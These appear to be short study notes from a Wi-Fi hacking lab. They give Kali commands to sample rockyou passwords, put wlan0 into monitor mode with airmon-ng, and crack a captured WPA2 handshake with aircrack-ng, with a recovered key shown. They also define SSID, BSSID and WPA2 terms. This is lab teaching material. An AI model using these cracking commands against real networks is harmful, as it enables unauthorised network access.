Generate 5 random passwords from rockyou, you can use this command on Kali : `head /usr/share/wordlists/rockyou.txt -n 10000 | shuf -n 5 -`

put the interface “wlan0” into monitor mode with Aircrack tools : `airmon-ng start wlan0`

https://www.aircrack-ng.org/doku.php?id=airmon-ng

Key Terms

SSID: The network "name" that you see when you try and connect

ESSID: An SSID that *may* apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you're attacking.

BSSID: An access point MAC (hardware) address

WPA2-PSK: Wifi networks that you connect to by providing a password that's the same for everyone

WPA2-EAP: Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.

RADIUS: A server for authenticating clients, not just for wifi.

aircrack-ng -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt NinjaJc01-01.cap

KEY FOUND! [ greeneggsandham ]
